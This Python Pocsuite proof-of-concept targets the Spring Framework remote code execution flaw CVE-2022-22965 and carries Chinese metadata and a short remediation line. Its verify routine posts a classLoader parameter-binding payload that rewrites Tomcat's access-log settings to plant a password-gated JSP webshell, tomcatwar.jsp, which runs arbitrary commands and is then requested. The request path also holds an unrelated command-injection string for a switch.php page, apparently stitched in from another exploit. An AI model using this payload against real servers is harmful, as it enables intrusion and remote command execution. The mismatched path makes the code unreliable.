#!/usr/bin/env python
# coding: utf-8

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url

class TestPOC(POCBase):
	vulID = '''CVE-2022-22965'''
	cveID = '''CVE-2022-22965'''
	cnvdID = '''CNVD-2022-23942'''
	cnnvdID = ''''''
	version = ''''''
	author = '''郝志成'''
	vulDate = '''2022-03-30'''
	createDate = '''2022-03-30'''
	updateDate = '''2022-03-30'''
	name = '''Spring远程代码执行漏洞'''
	desc = '''
通过该漏洞可写入webshell以及命令执行。
在Spring框架的JDK9版本(及以上版本)中，
远程攻击者可在满足特定条件的基础上，
通过框架的参数绑定功能获取AccessLogValve对象并诸如恶意字段值，
从而触发pipeline机制并写入任意路径下的文件。
'''
	solution = '''升级Spring Framework 版本，或采用WAF防御或通过黑名单策略进行防护。'''
	severity = ''''''
	vulType = ''''''
	taskType = ''''''
	references = ['''https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-java-spring-rce-Zx9GUc67''', '''https://www.oracle.com/security-alerts/cpujul2022.html''']
	appName = '''Spring Framework'''
	appVersion = '''5.2.20+, 5.3.18+'''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']

	def _attack(self):
		return self._verify()

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target, 80)
		result = {}
		headers = {
			"suffix": "%>//",
	         "c1": "Runtime",
	         "c2": "<%",
	         "DNT": "1",    \
	         "Content-Type": "application/x-www-form-urlencoded",
		}
		data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22w%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
		path="/switch.php?current=1%27%0aecho%20Test^By^ZsfTest$1By$1Zsf"
		vul_url = make_verify_url(self.url,path,mod=0)
		resp = req.post(url=vul_url,data=data, headers = headers, verify = False, allow_redirects = False, timeout = 10)
		shellurl = make_verify_url(vul_url,'tomcatwar.jsp')
		shellexploit = req.post(shellurl,allow_redirects=False,verify=False,stream=True,timeout=15)
		if  shellexploit.status_code == 200 :
			result['VerifyInfo'] = http_packet(resp)
			result['VerifyInfo']['URL'] = vul_url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output

register(TestPOC)